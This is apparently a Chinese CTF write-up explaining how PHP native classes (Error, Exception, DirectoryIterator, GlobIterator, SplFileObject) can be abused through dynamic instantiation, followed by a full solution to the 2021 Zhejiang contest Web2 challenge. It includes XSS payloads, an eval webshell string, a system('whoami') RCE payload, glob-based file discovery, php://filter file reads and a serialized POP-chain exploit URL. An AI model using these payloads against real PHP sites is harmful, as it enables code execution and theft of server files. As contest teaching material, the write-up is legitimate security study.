## 前景

刚刚结束的浙江省网络安全大赛，其中Web类的第二题考察了POP链以及原生类的利用，在比赛期间只构造了POP链、得到flag的文件名，但是并没有利用原生类将flag文件完整读出来。这篇文章将会把这个题涉及到的知识点复现一遍，并且给出这个题详细的WP。

## 原生类

### 报错类

#### Error

在PHP7版本中，因为Error中带有`__toString`方法，该方法会将传入给`__toString`的参数原封不动的输出到浏览器。在这么一个过程中可能会产生XSS。

例如，有以下代码：

    
    
    <?php$a = $_GET['a'];$b = $_GET['b'];echo new $a($b);

当传入下方payload的时候，会产生XSS。

    
    
    ?a=Error&b=<script>alert("Lxxx");</script>

![1635820964_6180a5a41bc92389ab402.png!small](https://image.3001.net/images/20211102/1635820964_6180a5a41bc92389ab402.png!small)

#### Exception

与Error类似，Exception同样有`__toString`方法，因此测试代码和上方一样，传入以下payload，同样可以XSS。

    
    
    ?a=Exception&b=<script>alert("Lxxx");</script>

![1635821030_6180a5e64ba9b5fd61609.png!small](https://image.3001.net/images/20211102/1635821030_6180a5e64ba9b5fd61609.png!small)

这个时候可能就会有聪明又帅气的师傅们问了，那既然是会被PHP执行，那么可不可以往里面传一句话木马呢？

同样还是上方的测试代码，我们传以下payload：

    
    
    ?a=Exception&b=eval($_POST[1]);

![1635821085_6180a61dcd9386741de56.png!small](https://image.3001.net/images/20211102/1635821085_6180a61dcd9386741de56.png!small)

可以看到，传入的一句话木马被原封不动的打印出来，因此在上方这种测试代码中，无法RCE。

不过如果将测试代码换一个写法，那么就可以RCE，我们将测试代码修改如下：

    
    
    <?php$a = $_GET['a'];$b = $_GET['b'];eval("echo new $a($b());");

这个时候我们传入以下payload。

    
    
    ?a=Exception&b=system('whoami')

![1635821153_6180a661da319826eb6cc.png!small](https://image.3001.net/images/20211102/1635821153_6180a661da319826eb6cc.png!small)

这个时候虽然报错了，但是仍然可以RCE，RCE的主要原因不是Exception这个类，而是因为PHP会先执行括号内的内容，如果执行括号内的内容没有报错，再执行括号外的报错，没有报错的部分的命令同样被正常执行。因此如果将上方测试代码的第四行eval删去，则无法进行RCE。

### 遍历目录类

#### DirectoryIterator

DirectoryIterator类的`__construct`方法会构造一个迭代器，如果使用echo输出该迭代器，将会返回迭代器的第一项。

假设我们有以下代码：

    
    
    <?php$a = $_GET['a'];$b = $_GET['b'];echo new $a($b);

这个时候我们传参如下：

    
    
    ?a=DirectoryIterator&b=.

![1635821187_6180a683a6b4cc6df8376.png!small](https://image.3001.net/images/20211102/1635821187_6180a683a6b4cc6df8376.png!small)

在页面中返回了一个点（真的是一个点，不是显示屏上的污渍），

这个点代表是当前目录，如果我们想要匹配其余文件，可以使用`glob`协议。

    
    
    ?a=DirectoryIterator&b=glob://flag*

![1635821219_6180a6a3e8cab6986c876.png!small](https://image.3001.net/images/20211102/1635821219_6180a6a3e8cab6986c876.png!small)

那么这个时候又有聪明又帅气的师傅要问了，如果这个时候不知道flag文件名怎么办？

答案是： **暴力搜索**

    
    
    ?a=DirectoryIterator&b=glob://f[k-m]*

![1635821246_6180a6bef358da232e2b4.png!small](https://image.3001.net/images/20211102/1635821246_6180a6bef358da232e2b4.png!small)

glob协议同样是支持通配符，包括ascii码中的部分匹配，例如想要匹配大写字母，那么就写`[@-[]`表示ASCII码字符从`@`到`[`都允许匹配，也就是匹配大写字母。

#### FilesystemIterator

同样的，如果DirectoryIterator类因为奇奇怪怪的原因被禁用了，还有FilesystemIterator类可以代替，使用方法和DirectoryIterator类差不多，这里就不过多赘述。

![1635821281_6180a6e1e7b1e8357edbf.png!small](https://image.3001.net/images/20211102/1635821281_6180a6e1e7b1e8357edbf.png!small)

#### GlobIterator

GlobIterator和上方这两个类差不多，不过glob是GlobIterator类本身自带的，因此在遍历的时候，就不需要带上glob协议头了，只需要后面的相关内容。

    
    
    ?a=GlobIterator&b=f[k-m]*

![1635821298_6180a6f23b7bad31eff20.png!small](https://image.3001.net/images/20211102/1635821298_6180a6f23b7bad31eff20.png!small)

### 读取文件类

#### SplFileObject

> SplFileObject类为文件提供了一个面向对象接口

说句人话就是这个类可以用来读文件，具体怎么读呢？下面做个测试。

同样还是这个测试代码：

    
    
    <?php$a = $_GET['a'];$b = $_GET['b'];echo new $a($b);

我们传payload如下：

    
    
    ?a=SplFileObject&b=flag.php

![1635821335_6180a717c91981effb4d0.png!small](https://image.3001.net/images/20211102/1635821335_6180a717c91981effb4d0.png!small)

利用这个类可以将我们的flag.php文件读出来。

不过有细心又帅气的师傅要问了，你这怎么就读了一行啊，还读了一个假的flag，你这SplFileObject保熟嘛？

确实，SplFileObject这个类返回的仍然是一个迭代器，想要将内容完整的输出出来，最容易想到的自然是利用`foreach`遍历，不过还有没有其他方法将其读取出来呢？

我们先看官方文档，看看SplFileObject类的`__construct`方法到底是怎么样的？

![1635821354_6180a72a50e3ab8e49b5d.png!small](https://image.3001.net/images/20211102/1635821354_6180a72a50e3ab8e49b5d.png!small)

可以看到，要求我们传入的参数是一个文件名，参数是文件名的方法联想到了什么？还有哪些方法是需要传入文件名的？（require，include，file_get_contents，file_put_contents等等等等）

而这些方法都有一个共同点就是，可以用伪协议。

虽然官方文档上没有说（也可能是因为我没看到），但是我们还是可以大胆的猜想，SplFileObject可以使用伪协议。

因此我们传入payload：

    
    
    ?a=SplFileObject&b=php://filter/convert.base64-encode/resource=flag.php

可以看到，这个时候flag.php就被我们完整的读取出来了。

![1635821372_6180a73c5d00fcdbf6dcf.png!small](https://image.3001.net/images/20211102/1635821372_6180a73c5d00fcdbf6dcf.png!small)

### 其余类

本质上不能说是其余类，不过在文章的后半部分会讲解今年浙江网安省赛其中一道web题，其余没有在这道题中用到的原生类我就不在这里赘述了，给个类名让师傅们参考参考。

  * ReflectionMethod

  * ReflectionClass

  * SoapClient

  * SimpleXMLElement

  * ZipArchive

## 2021浙江网络安全省赛Web2的WP

题目代码如下：

    
    
    <?phperror_reporting(0);class A1{public $tmp1;public $tmp2;public function __construct(){echo "Enjoy Hacking!";}public function __wakeup(){$this->tmp1->hacking();}}class A2{public $tmp1;public $tmp2;public function hacking(){echo "Hacked By Bi0x";}}class A3{public $tmp1;public $tmp2;public function hacking(){$this->tmp2->get_flag();}}class A4{public $tmp1='1919810';public $tmp2;public function get_flag(){echo "flag{".$this->tmp1."}";}}class A5{public $tmp1;public $tmp2;public function __call($a,$b){$f=$this->tmp1;$f();}}class A6{public $tmp1;public $tmp2;public function __toString(){$this->tmp1->hack4fun();return "114514";}}class A7{public $tmp1="Hello World!";public $tmp2;public function __invoke(){echo "114514".$this->tmp2.$this->tmp1;}}class A8{public $tmp1;public $tmp2;public function hack4fun(){echo "Last step,Ganbadie~";if(isset($_GET['DAS'])){$this->tmp1=$_GET['DAS'];}if(isset($_GET['CTF'])){$this->tmp2=$_GET['CTF'];}echo new $this->tmp1($this->tmp2);}}if(isset($_GET['DASCTF'])){unserialize($_GET['DASCTF']);}else{highlight_file(__FILE__);}

这道题的前半部分是POP链的相关内容，由于POP链不在这篇文章涉及到的知识点范围之内，因此就简略一点，直接给出我在做题的时候写的思路以及POC。

![1635821416_6180a768bb2d23b887a66.png!small](https://image.3001.net/images/20211102/1635821416_6180a768bb2d23b887a66.png!small)

    
    
    <?php​class A1{public $tmp1;public $tmp2;public function __construct(){$this->tmp1 = new A3();echo "Enjoy Hacking!"."<br/>";}public function __wakeup(){$this->tmp1->hacking();}}class A2{public $tmp1;public $tmp2;public function hacking(){echo "Hacked By Bi0x";}}class A3{public $tmp1;public $tmp2;public function __construct(){$this->tmp2 = new A4();}public function hacking(){​$this->tmp2->get_flag();}}class A4{public $tmp1;public $tmp2;public function __construct(){$this->tmp1 = new A6();}public function get_flag(){echo "flag{".$this->tmp1."}";}}class A5{public $tmp1 = "";public $tmp2;public function __call($a,$b){$f=$this->tmp1;$f();}}class A6{public $tmp1;public $tmp2;public function __construct(){$this->tmp1 = new A8();}public function __toString(){$this->tmp1->hack4fun();return "114514";}}class A7{public $tmp1="Hello World!";public $tmp2;public function __invoke(){echo "114514".$this->tmp2.$this->tmp1;}}class A8{public $tmp1 ;public $tmp2 ;public function hack4fun(){echo "Last step,Ganbadie~";if(isset($_GET['DAS'])){$this->tmp1=$_GET['DAS'];}if(isset($_GET['CTF'])){$this->tmp2=$_GET['CTF'];}echo new $this->tmp1($this->tmp2);}}​$a = new A1();echo urlencode(serialize($a));

得到部分payload：

    
    
    O%3A2%3A%22A1%22%3A2%3A%7Bs%3A4%3A%22tmp1%22%3BO%3A2%3A%22A3%22%3A2%3A%7Bs%3A4%3A%22tmp1%22%3BN%3Bs%3A4%3A%22tmp2%22%3BO%3A2%3A%22A4%22%3A2%3A%7Bs%3A4%3A%22tmp1%22%3BO%3A2%3A%22A6%22%3A2%3A%7Bs%3A4%3A%22tmp1%22%3BO%3A2%3A%22A8%22%3A2%3A%7Bs%3A4%3A%22tmp1%22%3BN%3Bs%3A4%3A%22tmp2%22%3BN%3B%7Ds%3A4%3A%22tmp2%22%3BN%3B%7Ds%3A4%3A%22tmp2%22%3BN%3B%7D%7Ds%3A4%3A%22tmp2%22%3BN%3B%7D

将上方的payload传入DASCTF参数即可。

这个时候当字符串反序列化到`A8`这个类中，需要我们传入`DAS`以及`CTF`参数，其中关键代码如下：

    
    
    echo new $this->tmp1($this->tmp2);

因此我们先把flag文件名找出来，我们可以利用DirectoryIterator类结合glob遍历目录，得到flag文件名为`flaggggggggggg.php`

    
    
    ?DAS=DirectoryIterator&CTF=glob://flag*

得到文件名之后就读取文件，利用SplFileObject类结合伪协议读取`flaggggggggggg.php`文件。

    
    
    ?DASCTF=O%3A2%3A%22A1%22%3A2%3A%7Bs%3A4%3A%22tmp1%22%3BO%3A2%3A%22A3%22%3A2%3A%7Bs%3A4%3A%22tmp1%22%3BN%3Bs%3A4%3A%22tmp2%22%3BO%3A2%3A%22A4%22%3A2%3A%7Bs%3A4%3A%22tmp1%22%3BO%3A2%3A%22A6%22%3A2%3A%7Bs%3A4%3A%22tmp1%22%3BO%3A2%3A%22A8%22%3A2%3A%7Bs%3A4%3A%22tmp1%22%3BN%3Bs%3A4%3A%22tmp2%22%3BN%3B%7Ds%3A4%3A%22tmp2%22%3BN%3B%7Ds%3A4%3A%22tmp2%22%3BN%3B%7D%7Ds%3A4%3A%22tmp2%22%3BN%3B%7D&DAS=SplFileObject&CTF=php://filter/convert.base64-encode/resource=flaggggggggggg.php

最终再将浏览器的回显进行base64解码即可得到flag。

